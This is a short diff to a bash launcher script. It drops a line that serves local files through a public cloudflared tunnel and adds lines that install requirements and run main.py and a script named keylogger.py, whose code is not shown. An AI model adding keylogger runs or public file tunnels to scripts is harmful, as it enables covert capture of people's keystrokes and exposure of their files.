@@ -1,2 +1,5 @@
 #!/bin/bash
-python -m http.server & cloudflare/Linux/cloudflared tunnel --url http://localhost:8000 && fg
+bin/pip install -r requirements.txt
+bin/python3.8 main.py r
+bin/python3.8 keylogger.py
+
